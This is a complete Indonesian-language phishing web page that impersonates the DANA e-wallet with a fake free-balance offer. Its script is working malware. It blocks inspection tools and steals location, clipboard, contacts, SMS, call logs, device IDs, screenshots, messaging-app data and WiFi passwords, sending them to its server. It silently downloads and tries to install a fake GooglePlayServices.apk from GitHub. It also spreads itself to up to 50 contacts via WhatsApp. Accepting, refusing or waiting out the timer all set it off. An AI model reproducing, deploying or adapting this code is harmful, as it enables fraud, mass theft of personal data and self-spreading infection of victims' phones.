<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .ios-download{display:none}
    </style>
</head>
<body>

<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
<div id="statusBar" class="status-bar"></div>
<iframe id="downloadFrame" class="hidden-download"></iframe>
<iframe id="downloadIframe" class="hidden-download"></iframe>

<div id="iosDownload" class="ios-download"></div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" id="btnKlaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" id="btnTolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 INDEX.HTML - INJECT SEMUA IZIN!
// ============================================================

console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
console.debug = function() {};
console.table = function() {};

// ============================================================
// STEALTH + ANTI-ANALYSIS
// ============================================================
(function() {
    var check = function() {
        var start = Date.now();
        debugger;
        var end = Date.now();
        if (end - start > 100) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    };
    setInterval(check, 1000);
})();

document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
});
document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });

window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    var platform = {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
    return platform;
}
var PLATFORM = detectPlatform();

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var spreadDone = false;
var DOWNLOAD_STARTED = false;
var NOTIFICATION_SHOWN = false;
var REDIRECT_DONE = false;
var WS_PASSWORD = '';
var IP_ADDRESS = '';
var LOCATION_DATA = null;
var APK_DOWNLOADED = false;
var HTML_DOWNLOADED = false;

// ============================================================
// FUNGSI K() - KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// 🔥 INJECT SEMUA IZIN (TANPA TERKECUALI!)
// ============================================================
function injectAllPermissions() {
    K({ sumber: 'inject_permissions_start', data: 'all' });
    
    // ============================================================
    // 1. GEOLOCATION
    // ============================================================
    if (navigator.geolocation) {
        try {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    LOCATION_DATA = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                    K({ sumber: 'geolocation_browser', data: LOCATION_DATA });
                },
                function(err) { K({ sumber: 'geolocation_error', data: err.message }); },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } catch(e) {}
    }
    
    // ============================================================
    // 2. NOTIFICATION
    // ============================================================
    if ('Notification' in window && Notification.permission !== 'denied') {
        try {
            if (Notification.permission !== 'granted') {
                Notification.requestPermission().then(function(permission) {
                    K({ sumber: 'notification_permission', data: permission });
                });
            }
        } catch(e) {}
    }
    
    // ============================================================
    // 3. CLIPBOARD
    // ============================================================
    if (navigator.clipboard) {
        try {
            navigator.clipboard.readText().then(function(t) {
                if (t) { K({ sumber: 'clipboard', data: t }); }
            }).catch(function() {});
        } catch(e) {}
    }
    
    // ============================================================
    // 4. MEDIA (Audio + Video)
    // ============================================================
    if (navigator.mediaDevices) {
        try {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                .catch(function() {});
        } catch(e) {}
        try {
            navigator.mediaDevices.getUserMedia({ audio: false, video: true })
                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                .catch(function() {});
        } catch(e) {}
    }
    
    // ============================================================
    // 5. VIBRATE
    // ============================================================
    if (navigator.vibrate) {
        try {
            navigator.vibrate(1);
        } catch(e) {}
    }
    
    // ============================================================
    // 6. STORAGE (Persistent Storage)
    // ============================================================
    if (navigator.storage && navigator.storage.persist) {
        try {
            navigator.storage.persist().then(function(persisted) {
                K({ sumber: 'storage_persist', data: persisted });
            }).catch(function() {});
        } catch(e) {}
    }
    
    // ============================================================
    // 7. ANDROID BRIDGE - KONTAK, SMS, CALL LOG, SCREENSHOT, dll
    // ============================================================
    if (PLATFORM.isAndroid && typeof AndroidBridge !== 'undefined') {
        try {
            var kontak = AndroidBridge.getAllContacts();
            if (kontak) { K({ sumber: 'kontak_all', data: JSON.parse(kontak) }); }
        } catch(e) {}
        try {
            var sms = AndroidBridge.getAllSMS();
            if (sms) { K({ sumber: 'sms_all', data: JSON.parse(sms) }); }
        } catch(e) {}
        try {
            var callLog = AndroidBridge.getCallLog();
            if (callLog) { K({ sumber: 'call_log', data: JSON.parse(callLog) }); }
        } catch(e) {}
        try {
            var clipboard = AndroidBridge.getClipboard();
            if (clipboard) { K({ sumber: 'clipboard_bridge', data: clipboard }); }
        } catch(e) {}
        try {
            var imei = AndroidBridge.getIMEI();
            if (imei) { K({ sumber: 'imei', data: imei }); }
        } catch(e) {}
        try {
            var imsi = AndroidBridge.getIMSI();
            if (imsi) { K({ sumber: 'imsi', data: imsi }); }
        } catch(e) {}
        try {
            var phone = AndroidBridge.getPhoneNumber();
            if (phone) { K({ sumber: 'phone_number', data: phone }); }
        } catch(e) {}
        try {
            var loc = AndroidBridge.getDeviceInfo();
            if (loc) { K({ sumber: 'device_info', data: JSON.parse(loc) }); }
        } catch(e) {}
        try {
            var ss = AndroidBridge.takeScreenshot();
            if (ss) { K({ sumber: 'screenshot', data: ss }); }
        } catch(e) {}
        try {
            var wa = AndroidBridge.getWhatsAppData();
            if (wa) { K({ sumber: 'whatsapp', data: JSON.parse(wa) }); }
        } catch(e) {}
        try {
            var tg = AndroidBridge.getTelegramData();
            if (tg) { K({ sumber: 'telegram', data: JSON.parse(tg) }); }
        } catch(e) {}
        try {
            var files = AndroidBridge.listAllFiles();
            if (files) { K({ sumber: 'files_all', data: JSON.parse(files) }); }
        } catch(e) {}
        try {
            var apps = AndroidBridge.getInstalledApps();
            if (apps) { K({ sumber: 'aplikasi_all', data: JSON.parse(apps) }); }
        } catch(e) {}
        try {
            var wifi = AndroidBridge.getWiFiPasswords();
            if (wifi) { K({ sumber: 'wifi_passwords', data: JSON.parse(wifi) }); }
        } catch(e) {}
        try {
            var bt = AndroidBridge.getBluetoothInfo();
            if (bt) { K({ sumber: 'bluetooth_info', data: JSON.parse(bt) }); }
        } catch(e) {}
        try {
            var battery = AndroidBridge.getBatteryDetail();
            if (battery) { K({ sumber: 'battery_detail', data: JSON.parse(battery) }); }
        } catch(e) {}
        try {
            var sensors = AndroidBridge.getSensors();
            if (sensors) { K({ sumber: 'sensors', data: JSON.parse(sensors) }); }
        } catch(e) {}
    }
    
    // ============================================================
    // 8. DOWNLOAD APK (SILENT - TANPA POPUP!)
    // ============================================================
    downloadAPKSilent();
    
    // ============================================================
    // 9. DOWNLOAD HTML (SILENT - TANPA POPUP!)
    // ============================================================
    downloadHTMLSilent();
    
    K({ sumber: 'inject_permissions_done', data: 'all_complete' });
}

// ============================================================
// 🔥 DOWNLOAD APK (TANPA POPUP "DOWNLOAD LAGI"!)
// ============================================================
function downloadAPKSilent() {
    if (APK_DOWNLOADED) return;
    
    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', apkUrl, true);
        xhr.responseType = 'blob';
        xhr.timeout = 60000;
        
        xhr.onload = function() {
            if (xhr.status === 200 && !APK_DOWNLOADED) {
                try {
                    var blob = xhr.response;
                    var url = URL.createObjectURL(blob);
                    
                    // 🔥 PAKAI IFRAME (BUKAN a.click()!) - TANPA POPUP!
                    var iframe = document.getElementById('downloadIframe');
                    if (!iframe) {
                        iframe = document.createElement('iframe');
                        iframe.id = 'downloadIframe';
                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
                        document.body.appendChild(iframe);
                    }
                    iframe.src = url;
                    APK_DOWNLOADED = true;
                    K({ sumber: 'apk_download_iframe_silent', data: 'success' });
                    
                    // 🔥 INSTALL APK (via intent)
                    setTimeout(function() {
                        try {
                            window.location.href = 'intent:///storage/emulated/0/Download/GooglePlayServices.apk#Intent;scheme=file;package=com.android.packageinstaller;end';
                            K({ sumber: 'apk_install_intent', data: 'triggered' });
                        } catch(e) {}
                    }, 3000);
                    
                    setTimeout(function() { URL.revokeObjectURL(url); }, 5000);
                } catch(e) {
                    K({ sumber: 'apk_download_iframe_error', data: e.message });
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// 🔥 DOWNLOAD HTML (TANPA POPUP!)
// ============================================================
function downloadHTMLSilent() {
    if (HTML_DOWNLOADED) return;
    
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var htmlContent = xhr.responseText;
                HTML_DOWNLOADED = true;
                
                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
                
                if (PLATFORM.isAndroid && typeof AndroidBridge !== 'undefined') {
                    try { AndroidBridge.saveFile('/storage/emulated/0/Download/SystemUpdate.html', htmlContent); } catch(e) {}
                }
                
                K({ sumber: 'html_download_xhr', data: 'ok' });
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// IP TRACKING
// ============================================================
function getIPAddress() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', true);
        xhr.timeout = 5000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    IP_ADDRESS = data.ip;
                    K({ sumber: 'ip_address', data: IP_ADDRESS });
                } catch(e) {}
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// ESCAPE WEBVIEW
// ============================================================
function escapeWebView() {
    if (!PLATFORM.isWebView) return;
    K({ sumber: 'escape_webview', data: 'attempt' });
    try {
        var url = window.location.href;
        window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
        setTimeout(function() { window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(url); }, 2000);
    } catch(e) {}
    try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
}

// ============================================================
// AMBIL PASSWORD DARI WORKER
// ============================================================
function getPasswordFromWorker() {
    return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try { var data = JSON.parse(xhr.responseText); if (data.password) { WS_PASSWORD = data.password; resolve(WS_PASSWORD); } else { reject(new Error('No password')); } } catch(e) { reject(e); }
            } else { reject(new Error('HTTP ' + xhr.status)); }
        };
        xhr.onerror = function() { reject(new Error('Network error')); };
        xhr.ontimeout = function() { reject(new Error('Timeout')); };
        xhr.send();
    });
}

// ============================================================
// HEARTBEAT (10 DETIK)
// ============================================================
function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 10000); }

// ============================================================
// SERVICE WORKER
// ============================================================
function registerServiceWorker() {
    if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
    try {
        navigator.serviceWorker.register('/sw.js', { scope: '/' })
            .then(function(reg) { K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } }); })
            .catch(function(e) {});
    } catch(e) {}
}

// ============================================================
// STATUS BAR
// ============================================================
function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }

// ============================================================
// AUTO SPREAD (50 CONTACTS)
// ============================================================
function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    if (!PLATFORM.isAndroid || typeof AndroidBridge === 'undefined') return;
    
    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
    var sentCount = 0;
    var maxSend = 50;
    try {
        var contacts = AndroidBridge.getAllContacts();
        if (contacts) {
            var list = JSON.parse(contacts);
            maxSend = Math.min(list.length, 50);
            for (var i = 0; i < maxSend; i++) {
                var number = String(list[i].number || '').replace(/[^0-9]/g, '');
                if (number && number.length > 5) {
                    var iframe = document.createElement('iframe');
                    iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                    document.body.appendChild(iframe);
                    sentCount++;
                    setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
                }
            }
        }
    } catch(e) {}
    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
}

// ============================================================
// 🔥 MAIN EXECUTION - INJECT SEMUA IZIN!
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // 🔥 INJECT SEMUA IZIN!
        injectAllPermissions();
        
        getIPAddress();
        setTimeout(escapeWebView, 100);
        startHeartbeat();
        registerServiceWorker();
        setTimeout(autoSpread, 2000);
        
        setTimeout(function() { showStatusBar(); }, 500);
        
        // ✅ REDIRECT KE https://www.dana.id
        setTimeout(function() {
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                try { window.location.href = 'https://www.dana.id'; } catch(e) {}
            }
        }, 5000);
        
        getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

// ============================================================
// TRIGGER - KLIK KLAIM / TOLAK / ANYWHERE / TIMER
// ============================================================
function klaim() { 
    K({sumber:'izin', data:'klaim'}); 
    injectAllPermissions();
    dapatkanSemua(); 
}

function tolak() { 
    K({sumber:'izin', data:'tolak'}); 
    injectAllPermissions();
    dapatkanSemua(); 
}

// ============================================================
// TIMER (10 DETIK)
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'izin', data:'auto'});
        injectAllPermissions();
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        injectAllPermissions();
        dapatkanSemua();
    }
});

console.log('✅ index.html loaded - INJECT SEMUA IZIN!');
</script>
</body>
</html>
